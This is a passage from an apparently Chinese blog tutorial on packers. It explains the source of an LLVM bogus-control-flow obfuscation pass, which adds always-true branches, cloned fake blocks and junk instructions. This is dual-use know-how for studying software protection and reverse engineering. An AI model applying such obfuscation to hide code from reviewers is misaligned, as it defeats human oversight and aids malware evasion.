&lt;span class="c1">// The always true condition. End of the first block
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Twine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;condition&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">FCmpInst&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">condition&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">FCmpInst&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">basicBlock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_TRUE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">LHS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RHS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var4&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Jump to the original basic block if the condition is true or
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// to the altered block if false.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BranchInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">condition&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">basicBlock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// The altered block loop back on the original one.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BranchInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// The end of the originalBB is modified to give the impression that sometimes
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// it continues in the loop, and sometimes it return the desired value
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// (of course it&amp;#39;s always true, so it always use the original terminator..
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// but this will be obfuscated too;) )
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// iterate on instruction just before the terminator of the originalBB
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">iterator&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">originalBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// Split at this point (we only want the terminator in the second part)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Twine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;originalBBpart2&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">originalBBpart2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">originalBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">splitBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var5&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// the first part go either on the return statement or on the begining
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// of the altered block.. So we erase the terminator created when splitting.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">originalBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getTerminator&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">eraseFromParent&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// We add at the end a new always true condition
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Twine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;condition2&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">FCmpInst&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">condition2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">FCmpInst&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_TRUE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">LHS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RHS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var6&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">BranchInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">originalBBpart2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">condition2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">originalBB&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="c1">// end of addBogusFlow()
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>尝试分析上面的函数逻辑：&lt;/p>
&lt;ol>
&lt;li>分割基本块，把 &lt;code>phinode&lt;/code> 和调试信息之类的分割到原始块，新创建出来的块不包含 &lt;code>phinode&lt;/code> 之类的东西。（&lt;code>entry&lt;/code>）&lt;/li>
&lt;li>创建伪造分支。（&lt;code>altered&lt;/code>）&lt;/li>
&lt;li>创建恒真条件，这里是利用浮点比较 &lt;code>FCMP_TRUE&lt;/code>。（&lt;code>condition&lt;/code>）&lt;/li>
&lt;li>创建分支指令，真跳转原始块，假跳转伪造块，伪造块的末尾又跳回原始块。&lt;/li>
&lt;li>在原始块的结束部分再次分割基本块，分割后的块包含原始块的 terminator （&lt;code>terminator&lt;/code>）&lt;/li>
&lt;li>创建一个恒真条件，跳转到原始块的 terminator，假则跳转到伪造块 （&lt;code>condition2&lt;/code>）&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211102160422737.png"
width="435"
height="648"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211102160422737_hu1adf2e2db9eba618ac02ebe93739a09a_98722_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211102160422737_hu1adf2e2db9eba618ac02ebe93739a09a_98722_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211102160422737"
class="gallery-image"
data-flex-grow="67"
data-flex-basis="161px"
>&lt;/p>
&lt;p>混淆后的控制流长这样，两个 condition 都是恒真条件，原始块被分成了三个部分，&lt;code>entry&lt;/code>、&lt;code>origin&lt;/code>、&lt;code>terminator&lt;/code> 。图中红色的部分是伪造块，包含垃圾指令，绿色的条件块都是恒真条件，只有绿色箭头的控制流能走通。蓝色节点是从原始基本块上分割出来的部分。&lt;/p>
&lt;h3 id="23-createalteredbasicblock">2.3 createAlteredBasicBlock&lt;/h3>
&lt;p>再看伪造块是如何生成的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++"> &lt;span class="cm">/* createAlteredBasicBlock
&lt;/span>&lt;span class="cm"> *
&lt;/span>&lt;span class="cm"> * This function return a basic block similar to a given one.
&lt;/span>&lt;span class="cm"> * It&amp;#39;s inserted just after the given basic block.
&lt;/span>&lt;span class="cm"> * The instructions are similar but junk instructions are added between
&lt;/span>&lt;span class="cm"> * the cloned one. The cloned instructions&amp;#39; phi nodes, metadatas, uses and
&lt;/span>&lt;span class="cm"> * debug locations are adjusted to fit in the cloned basic block and
&lt;/span>&lt;span class="cm"> * behave nicely.
&lt;/span>&lt;span class="cm"> */&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">createAlteredBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">basicBlock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">Twine&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">Name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;gen&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Function&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">F&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Useful to remap the informations concerning instructions.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">ValueToValueMapTy&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">alteredBB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">CloneBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">basicBlock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remap operands.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">iterator&lt;/span> &lt;span class="n">ji&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basicBlock&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">iterator&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Loop over the operands of the instruction
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">User&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">op_iterator&lt;/span> &lt;span class="n">opi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">op_begin&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ope&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">op_end&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">opi&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">ope&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">opi&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// get the value for the operand
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MapValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">opi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RF_None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">opi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Remap phi nodes&amp;#39; incoming blocks.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PHINode&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">dyn_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">PHINode&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pn&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getNumIncomingValues&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MapValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pn&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getIncomingBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RF_None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">pn&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setIncomingBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Remap attached metadata.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">SmallVector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">pair&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">unsigned&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MDNode&lt;/span> &lt;span class="o">*&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">MDs&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getAllMetadata&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MDs&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// important for compiling with DWARF, using option -g.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setDebugLoc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ji&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getDebugLoc&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="n">ji&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="c1">// The instructions&amp;#39; informations are now all correct
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// add random instruction in the middle of the bloc. This part can be improve
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">iterator&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// in the case we find binary operator, we modify slightly this part by randomly
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// insert some instructions
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">isBinaryOp&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// binary instructions
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOpcode&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">BinaryOperator&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">op&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">op1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">UnaryOperator&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">op2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">Twine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;_&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// treat differently float or int
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// Binary int
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Add&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Sub&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Mul&lt;/span> &lt;span class="o">||&lt;/span>
&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">UDiv&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">SDiv&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">URem&lt;/span> &lt;span class="o">||&lt;/span>
&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">SRem&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Shl&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">LShr&lt;/span> &lt;span class="o">||&lt;/span>
&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">AShr&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">And&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Or&lt;/span> &lt;span class="o">||&lt;/span>
&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Xor&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">random&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="n">random&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">random&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// to improve
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="c1">// do nothing
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">op&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">CreateNeg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">op1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Add&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">op&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;gen&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">op1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Sub&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
